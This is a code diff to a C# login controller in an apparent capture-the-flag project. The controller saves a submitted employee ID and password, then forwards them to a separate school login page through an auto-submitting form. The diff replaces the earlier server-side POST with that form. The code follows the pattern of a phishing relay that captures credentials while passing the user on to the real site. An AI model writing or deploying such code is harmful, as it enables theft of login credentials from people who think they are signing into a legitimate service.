@@ -7,16 +7,9 @@ namespace CTFomni.Controllers;
 [Route("login")]
 public class LoginController : Controller
 {
-    private readonly IHttpClientFactory _httpClientFactory;
-
-    public LoginController(IHttpClientFactory httpClientFactory)
-    {
-        _httpClientFactory = httpClientFactory;
-    }
-
     [HttpPost]
     [Route("submit")]
-    public async Task<IActionResult> Login([FromForm] LoginModel model)
+    public IActionResult Login([FromForm] LoginModel model)
     {
         var validationResult = ValidateLoginData(model);
         if (!validationResult.IsValid)
@@ -24,41 +17,22 @@ public class LoginController : Controller
 
         SaveLoginData(model);
 
-        var targetUrl = "http://zeroday.cegeplabs.qc.ca/school/index.php";
-
-        var formData = new List<KeyValuePair<string, string>>();
+        var formData = new Dictionary<string, string>();
         if (model.TypeIdentification == "EmployeNormal")
         {
-            if (!string.IsNullOrEmpty(model.NoEmplEmployeNormal))
-                formData.Add(new KeyValuePair<string, string>("DA", model.NoEmplEmployeNormal));
-            if (!string.IsNullOrEmpty(model.PasswordEmplEmployeNormal))
-                formData.Add(new KeyValuePair<string, string>("Password", model.PasswordEmplEmployeNormal));
+            formData["DA"] = model.NoEmplEmployeNormal ?? "";
+            formData["Password"] = model.PasswordEmplEmployeNormal ?? "";
         }
         else
         {
             return BadRequest(new { message = "Type d'identification invalide." });
         }
-
-        var httpClient = _httpClientFactory.CreateClient();
-        var formContent = new FormUrlEncodedContent(formData);
-
-        try
+        
+        return View("AutoSubmitForm", new AutoSubmitFormModel
         {
-            var response = await httpClient.PostAsync(targetUrl, formContent);
-            var content = await response.Content.ReadAsStringAsync();
-
-            Debug.WriteLine("Réponse du serveur : " + content);
-
-            var redirectUrl = "http://zeroday.cegeplabs.qc.ca/school/employe.php";
-            Console.WriteLine("Redirection vers " + redirectUrl);
-
-            return Redirect(targetUrl);
-        }
-        catch (Exception ex)
-        {
-            Debug.WriteLine($"Erreur : {ex.Message}");
-            return Redirect("~/index.html");
-        }
+            ActionUrl = "http://zeroday.cegeplabs.qc.ca/school/index.php",
+            FormData = formData
+        });
     }
 
     private (bool IsValid, string ErrorMessage) ValidateLoginData(LoginModel model)
